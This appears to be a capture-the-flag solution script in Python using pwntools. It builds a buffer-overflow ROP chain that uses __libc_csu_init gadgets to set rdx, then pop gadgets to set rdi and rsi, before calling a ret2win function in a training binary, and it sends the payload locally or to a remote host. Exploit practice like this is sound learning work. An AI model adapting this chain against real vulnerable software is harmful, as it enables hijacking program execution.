#!/usr/bin/env python3

from argparse import ArgumentParser
from pwn import *


def get_proc(gdb_script=""):
    """
    Get the tube specified by command line arguments.
    """
    return _get_proc(*parse_args(), gdb_script)


def parse_args():
    """
    Parse command line arguments.
    """
    parser = ArgumentParser(description="pwn/re template")
    parser.add_argument("executable", type=str, help="path to executable")
    parser.add_argument("remote", default=[None, None], nargs="*", help="remote hostname and port")
    args = parser.parse_args()
    host, port = parse_remote(args.remote)
    return args.executable, host, port


def parse_remote(remote):
    """
    Validate command line arguments.
    """
    if isinstance(remote, str):
        remote = remote.split(":")
    try:
        host, port = remote
    except ValueError:
        raise ValueError("host and port required to use remote")
    return host, port


def _get_proc(executable, host, port, gdb_script):
    """
    Get a remote tube if host/port specified, otherwise a gdb-over-ssh tube to
    a VM/Docker environment.
    """
    context.binary = executable
    context.terminal = ['gnome-terminal', '--tab', '-e']
    if host is not None or port is not None:
        if host is None or port is None: 
            raise ValueError("both host and port must be specified for remote")
        proc = remote(host, port)
    else:        
        proc = gdb.debug(
            exe=executable,
            gdbscript=gdb_script,
            args=[executable],
            ssh=ssh('test','localhost', 2222, "test", ignore_config=True)
        )
    return proc


def main():
    gdb_script="""
    set sysroot ./
    set solib-search-path ./
    b *0x400689
    c
    """
    p = get_proc(gdb_script)

    payload = cyclic_find(0x6161616161616166, n=8) * b"a"
    payload += p64(0x40069a) # pop ...
    payload += p64(0x0) # rbx
    payload += p64(0x1) # rbp.  this will terminate the call loop in csu_init after 1 iteration
    payload += p64(0x600df0) # pointer to frame_dummy.  It's available as a pointer, it executes without segfault, and rdx is preserved
    payload += p64(0x0) # r13
    payload += p64(0x0) # r14
    payload += p64(0xd00df00dd00df00d) # r15
    payload += p64(0x400680) # mov rdx, r15

    # execution falls through to the pop sequence again
    payload += p64(0x0) # filler
    payload += p64(0x1) # rbx
    payload += p64(0x2) # rbp
    payload += p64(0x3) # r12
    payload += p64(0x4) # r13
    payload += p64(0x5) # r14
    payload += p64(0x6) # r15

    payload += p64(0x00000000004006a3) # pop rdi; ret; 
    payload += p64(0xdeadbeefdeadbeef)
 
    payload += p64(0x00000000004006a1) # pop rsi; pop r15; ret; 
    payload += p64(0xcafebabecafebabe)
    payload += p64(0x0)

    payload += p64(context.binary.sym.ret2win)

    p.sendline(payload)
    p.interactive()



if __name__ == "__main__":
    main()
